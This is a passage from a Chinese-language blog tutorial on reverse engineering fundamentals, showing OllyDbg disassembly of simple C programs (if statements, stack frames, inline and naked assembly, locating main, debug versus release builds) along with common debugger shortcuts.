class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,22);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040D440 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">0040D441  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">0040D443  |.  83EC 44       sub     esp,0x44</span><br><span class=\"line\">0040D446  |.  53            push    ebx</span><br><span class=\"line\">0040D447  |.  56            push    esi</span><br><span class=\"line\">0040D448  |.  57            push    edi</span><br><span class=\"line\">0040D449  |.  8D7D BC       lea     edi,[local.17]</span><br><span class=\"line\">0040D44C  |.  B9 11000000   mov     ecx,0x11</span><br><span class=\"line\">0040D451  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">0040D456  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//上面都是堆栈提升，初始化堆栈，if从这里开始</span><br><span class=\"line\"></span><br><span class=\"line\">// a=1</span><br><span class=\"line\">0040D458  |.  C745 FC 01000&gt;mov     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">// a==1?a=11:a=22</span><br><span class=\"line\">// 如果a!=1 jmp 0040D476</span><br><span class=\"line\">// 如果a!=1 printf(11) jmp(0040D485)</span><br><span class=\"line\">// jmp(0040D485)就是跳转到if判断结束的地方，继续执行下面的语句</span><br><span class=\"line\">0040D45F  |.  837D FC 01    cmp     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">0040D463  |.  75 11         jnz     short 0040D476</span><br><span class=\"line\">0040D465  |.  6A 0B         push    0xB                              ; /&lt;%d&gt; = B (11.)</span><br><span class=\"line\">0040D467  |.  68 0C214200   push    0042210C                         ; |format = &quot;%d</span><br><span class=\"line\"></span><br><span class=\"line\">0040D46C  |.  E8 4F020000   call    printf                           ; \\printf</span><br><span class=\"line\">0040D471  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0040D474  |.  EB 0F         jmp     short 0040D485</span><br><span class=\"line\">0040D476  |&gt;  6A 16         push    0x16                             ; /&lt;%d&gt; = 16 (22.)</span><br><span class=\"line\">0040D478  |.  68 0C214200   push    0042210C                         ; |format = &quot;%d</span><br><span class=\"line\"></span><br><span class=\"line\">0040D47D  |.  E8 3E020000   call    printf                           ; \\printf</span><br><span class=\"line\">0040D482  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0040D485  |&gt;  33C0          xor     eax,eax</span><br><span class=\"line\">0040D487  |.  5F            pop     edi</span><br><span class=\"line\">0040D488  |.  5E            pop     esi</span><br><span class=\"line\">0040D489  |.  5B            pop     ebx</span><br><span class=\"line\">0040D48A  |.  83C4 44       add     esp,0x44</span><br><span class=\"line\">0040D48D  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">0040D48F  |.  E8 BC3BFFFF   call    _chkesp</span><br><span class=\"line\">0040D494  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040D496  |.  5D            pop     ebp</span><br><span class=\"line\">0040D497  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"反汇编分析c语言\"><a class=\"markdownIt-Anchor\" href=\"#反汇编分析c语言\">#</a> 反汇编分析 C 语言</h3>\n<p>有了之前画堆栈图的经验，我们不难看出，尽管我们的函数是个空函数，但其汇编代码依然完成了以下流程：</p>\n<ol>\n<li>提升堆栈</li>\n<li>保护现场</li>\n<li>初始化提升的堆栈</li>\n<li>恢复现场</li>\n<li>返回</li>\n</ol>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">提升堆栈</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401010</span>   push        ebp</span><br><span class=\"line\"><span class=\"number\">00401011</span>   mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401013</span>   sub         esp,<span class=\"number\">40</span>h</span><br><span class=\"line\">保护现场</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401016</span>   push        ebx</span><br><span class=\"line\"><span class=\"number\">00401017</span>   push        esi</span><br><span class=\"line\"><span class=\"number\">00401018</span>   push        edi</span><br><span class=\"line\">PS：前面的push        ebp也是保护现场</span><br><span class=\"line\"></span><br><span class=\"line\">初始化提升的堆栈</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401019</span>   lea         edi,[ebp<span class=\"number\">-40</span>h]</span><br><span class=\"line\"><span class=\"number\">0040101</span>C   mov         ecx,<span class=\"number\">10</span>h</span><br><span class=\"line\"><span class=\"number\">00401021</span>   mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">00401026</span>   rep stos    dword ptr [edi]</span><br><span class=\"line\">恢复现场</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401028</span>   pop         edi</span><br><span class=\"line\"><span class=\"number\">00401029</span>   pop         esi</span><br><span class=\"line\"><span class=\"number\">0040102</span>A   pop         ebx</span><br><span class=\"line\"><span class=\"number\">0040102</span>B   mov         esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040102</span>D   pop         ebp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108201930358.png\" alt=\"image-20221108201930358\"></p>\n<h3 id=\"内联汇编\"><a class=\"markdownIt-Anchor\" href=\"#内联汇编\">#</a> 内联汇编</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushad   <span class=\"comment\">//通用寄存器入栈</span></span><br><span class=\"line\">\t\tpushfd   <span class=\"comment\">//标志寄存器入栈</span></span><br><span class=\"line\">\t\tmov al,<span class=\"number\">0xff</span></span><br><span class=\"line\">\t\tadd al,<span class=\"number\">1</span> <span class=\"comment\">//C,P,A,Z = 1</span></span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 VS2008 创建一个 win32 application</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108192317976.png\" alt=\"image-20221108192317976\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654239398565-0af1e19d-f2a4-4772-b49a-495dcdf19dca.png\" alt=\"img\"></p>\n<p>使用多线程 /mt 之后，用户运行时不需要库既可运行，但文件会变大</p>\n<p>编译一个内联函数</p>\n<p>nake 声明一个裸函数，即堆栈的申请释放都需要我们自己进行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int __declspec (naked) Plus()&#123;</span><br><span class=\"line\">                __asm&#123;</span><br><span class=\"line\">\t\t\t\t\t\tpushad</span><br><span class=\"line\">\t\t\t\t\t\txor     eax,eax</span><br><span class=\"line\">\t\t\t\t\t\tcmp     byte ptr ds:[0x4F040],al</span><br><span class=\"line\">\t\t\t\t\t\tretn</span><br><span class=\"line\">\t\t\t\t\t\tpopad</span><br><span class=\"line\">        &#125;        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPlus();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Plus () 对应的汇编代码为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00FC2240 &gt; &gt; \\60            pushad</span><br><span class=\"line\">00FC2241   .  33C0          xor     eax,eax</span><br><span class=\"line\">00FC2243      61            popad                       </span><br></pre></td></tr></table></figure>\n<p>正常的函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">int Plus()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x=1+2;</span><br><span class=\"line\">\treturn 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPlus();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">003813A0 &gt;  55              push    ebp</span><br><span class=\"line\">003813A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">003813A3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">003813A9    53              push    ebx</span><br><span class=\"line\">003813AA    56              push    esi</span><br><span class=\"line\">003813AB    57              push    edi</span><br><span class=\"line\">003813AC    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">003813B2    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">003813B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">003813BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">003813BE    C745 F8 0300000&gt;mov     dword ptr ss:[ebp-0x8],0x3</span><br><span class=\"line\">003813C5    B8 01000000     mov     eax,0x1</span><br><span class=\"line\">003813CA    5F              pop     edi</span><br><span class=\"line\">003813CB    5E              pop     esi</span><br><span class=\"line\">003813CC    5B              pop     ebx</span><br><span class=\"line\">003813CD    8BE5            mov     esp,ebp</span><br><span class=\"line\">003813CF    5D              pop     ebp</span><br><span class=\"line\">003813D0    C3              retn</span><br></pre></td></tr></table></figure>\n<p>正常的函数系统会自动帮我们进行堆栈的操作我们只需要关系自己的代码即可</p>\n<h3 id=\"寻找c程序入口\"><a class=\"markdownIt-Anchor\" href=\"#寻找c程序入口\">#</a> 寻找 C 程序入口</h3>\n<p>为什么能看到 wmain 的名称</p>\n<p>因为有 pdb 文件，od 读取 pdb 读取 debug 信息</p>\n<p>PDB 全称为程序数据库文件，存储了被编译文件的调试信息，一般用在调式程序中</p>\n<p>1. 找到 wmainCRTStartup</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210348946.png\" alt=\"image-20221108210348946\"></p>\n<p>2. 找到__tmainCRTStartup</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210432400.png\" alt=\"image-20221108210432400\"></p>\n<p>3. 这个 call 002C108C 就是我们的 main 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">002C260E   .  FF35 70F02D00 push    dword ptr ds:[__wargv]</span><br><span class=\"line\">002C2614   .  FF35 68F02D00 push    dword ptr ds:[__argc]</span><br><span class=\"line\">002C261A   .  E8 6DEAFFFF   call    002C108C</span><br></pre></td></tr></table></figure>\n<p>4.wmain 就是我们的 main 函数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210639094.png\" alt=\"image-20221108210639094\"></p>\n<blockquote>\n<p>mainCRTStartup 和 wmainCRTStartup 是控制台环境下多字节编码和 Unicode 编码的启动函数</p>\n<p>而 WinMainCRTStartup 和 wWinMainCRTStartup 是 windows 环境下多字节编码和 Unicode 编码的启动函数</p>\n<p>mainCRTStartup 做了哪些事：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210737730.png\" alt=\"image-20221108210737730\"></p>\n<ol>\n<li>前面我们已经知道了 mainCRTStartup 也就是程序入口，那么如何通过 mainCRTStartup 来找到 main 函数入口</li>\n<li>根据函数的参数来进行判断</li>\n<li>main 函数貌似只有两个参数，但实际上 main 函数一共有三个参数，只不过一般第三个参数我们并没有用到，于是在使用 main 函数时并没有加上，完整的 main 函数原型如下:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main(int argc,char *argv[],char *envp[])&#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的 argv 和 envp 对应 mainCRTStartup 里_setargv () 和_setenvp ()</p>\n<p>main 中参数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210850705.png\" alt=\"image-20221108210850705\"></p>\n</blockquote>\n<p>另一种歪门邪道：</p>\n<p>找一个有标示性的断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221111213357060.png\" alt=\"image-20221111213357060\"></p>\n<p>下断，跳转到断点，F9 执行到断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221111213436905.png\" alt=\"image-20221111213436905\"></p>\n<p>在堆栈窗口中选中，enter 建进入 main</p>\n<p>或者在有 printf 或者 MessageBox 时可以 F9   CTRL+F9</p>\n<h3 id=\"调试方式\"><a class=\"markdownIt-Anchor\" href=\"#调试方式\">#</a> 调试方式</h3>\n<p>1.OD 直接打开</p>\n<p>2. 附加到已经打开的进程</p>\n<h3 id=\"od常用操作\"><a class=\"markdownIt-Anchor\" href=\"#od常用操作\">#</a> OD 常用操作</h3>\n<p>F9 程序运行到所设断点处</p>\n<p>F2 设置软件断点</p>\n<p>ALT+C 初始页面</p>\n<p>bp  指令地址    设置软件断点</p>\n<p>dd ecx / 内存地址  查看 ecx 寄存器，寄存器中值</p>\n<p>F8 单步步过</p>\n<p>F7 单步步入</p>\n<p>CTRL + F9  执行到返回</p>\n<p>ALT + F9 执行到用户代码</p>\n<h3 id=\"函数调用\"><a class=\"markdownIt-Anchor\" href=\"#函数调用\">#</a> 函数调用</h3>\n<p>注意先关闭 c/c++ 优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int aaa=1;</span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMessageBox(0,NULL,NULL,MB_OK);</span><br><span class=\"line\">\taaa = add(3,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"release\"><a class=\"markdownIt-Anchor\" href=\"#release\">#</a> release</h4>\n<p>优化的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00371000 &gt;/$  6A 00         push    0x0                              ; /Style = MB_OK|MB_APPLMODAL</span><br><span class=\"line\">00371002  |.  6A 00         push    0x0                              ; |Title = NULL</span><br><span class=\"line\">00371004  |.  6A 00         push    0x0                              ; |Text = NULL</span><br><span class=\"line\">00371006  |.  6A 00         push    0x0                              ; |hOwner = NULL</span><br><span class=\"line\">00371008  |.  FF15 A4203700 call    dword ptr ds:[&lt;&amp;USER32.MessageBo&gt;; \\MessageBoxW</span><br><span class=\"line\">0037100E  |.  C705 18303700&gt;mov     dword ptr ds:[aaa],0x7</span><br><span class=\"line\">00371018  |.  33C0          xor     eax,eax</span><br><span class=\"line\">0037101A  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>未被优化的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012B1010 &gt;/$  55            push    ebp</span><br><span class=\"line\">012B1011  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">012B1013  |.  6A 00         push    0x0                                            ; /Style = MB_OK|MB_APPLMODAL</span><br><span class=\"line\">012B1015  |.  6A 00         push    0x0                                            ; |Title = NULL</span><br><span class=\"line\">012B1017  |.  6A 00         push    0x0                                            ; |Text = NULL</span><br><span class=\"line\">012B1019  |.  6A 00         push    0x0                                            ; |hOwner = NULL</span><br><span class=\"line\">012B101B  |.  FF15 E4802B01 call    dword ptr ds:[&lt;&amp;USER32.MessageBoxW&gt;]           ; \\MessageBoxW</span><br><span class=\"line\">012B1021  |.  6A 04         push    0x4</span><br><span class=\"line\">012B1023  |.  6A 03         push    0x3</span><br><span class=\"line\">012B1025  |.  E8 D6FFFFFF   call    add</span><br><span class=\"line\">012B102A  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">012B102D  |.  A3 40AC2B01   mov     dword ptr ds:[aaa],eax</span><br><span class=\"line\">012B1032  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012B1034  |.  5D            pop     ebp</span><br><span class=\"line\">012B1035  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>如果我们此时将代码改为如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int aaa=1;</span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMessageBox(0,NULL,NULL,MB_OK);</span><br><span class=\"line\">\taaa = add(aaa,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EB13F0 &gt;  55              push    ebp</span><br><span class=\"line\">00EB13F1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EB13F3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">00EB13F9    53              push    ebx</span><br><span class=\"line\">00EB13FA    56              push    esi</span><br><span class=\"line\">00EB13FB    57              push    edi</span><br><span class=\"line\">00EB13FC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">00EB1402    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">00EB1407    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EB140C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00EB140E    8BF4            mov     esi,esp</span><br><span class=\"line\">00EB1410    6A 00           push    0x0</span><br><span class=\"line\">00EB1412    6A 00           push    0x0</span><br><span class=\"line\">00EB1414    6A 00           push    0x0</span><br><span class=\"line\">00EB1416    6A 00           push    0x0</span><br><span class=\"line\">00EB1418    FF15 3883EB00   call    dword ptr ds:[&lt;&amp;USER32.MessageBoxW&gt;]    ; user32.MessageBoxW</span><br><span class=\"line\">00EB141E    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EB1420    E8 25FDFFFF     call    00EB114A</span><br><span class=\"line\">00EB1425    6A 04           push    0x4</span><br><span class=\"line\">00EB1427    A1 0070EB00     mov     eax,dword ptr ds:[aaa]</span><br><span class=\"line\">00EB142C    50              push    eax</span><br><span class=\"line\">00EB142D    E8 69FCFFFF     call    00EB109B</span><br><span class=\"line\">00EB1432    83C4 08         add     esp,0x8</span><br><span class=\"line\">00EB1435    A3 0070EB00     mov     dword ptr ds:[aaa],eax</span><br><span class=\"line\">00EB143A    33C0            xor     eax,eax</span><br><span class=\"line\">00EB143C    5F              pop     edi</span><br><span class=\"line\">00EB143D    5E              pop     esi</span><br><span class=\"line\">00EB143E    5B              pop     ebx</span><br><span class=\"line\">00EB143F    81C4 C0000000   add     esp,0xC0</span><br><span class=\"line\">00EB1445    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00EB1447    E8 FEFCFFFF     call    00EB114A</span><br><span class=\"line\">00EB144C    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EB144E    5D              pop     ebp</span><br><span class=\"line\">00EB144F    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EB13B0 &gt;  55              push    ebp</span><br><span class=\"line\">00EB13B1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EB13B3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">00EB13B9    53              push    ebx</span><br><span class=\"line\">00EB13BA    56              push    esi</span><br><span class=\"line\">00EB13BB    57              push    edi</span><br><span class=\"line\">00EB13BC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">00EB13C2    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">00EB13C7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EB13CC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00EB13CE    8B45 08     